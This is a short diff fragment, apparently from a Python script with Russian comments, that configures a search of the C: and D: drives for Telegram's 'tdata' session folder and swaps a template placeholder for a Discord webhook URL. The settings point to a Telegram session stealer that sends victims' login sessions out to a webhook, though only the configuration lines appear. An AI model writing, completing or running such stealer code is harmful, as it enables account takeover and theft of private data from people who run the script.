@@ -8,7 +8,7 @@ from discord_webhook import DiscordWebhook
 # ======= Настройки =======
 FOLDER_NAME = 'tdata'
 SEARCH_PATHS = ['D:\\', 'C:\\']
-WEBHOOK_URL = {{"HOOK"}}
+WEBHOOK_URL = "hook_url"
 
 # ======= Поиск папки tdata =======
 full_path = None
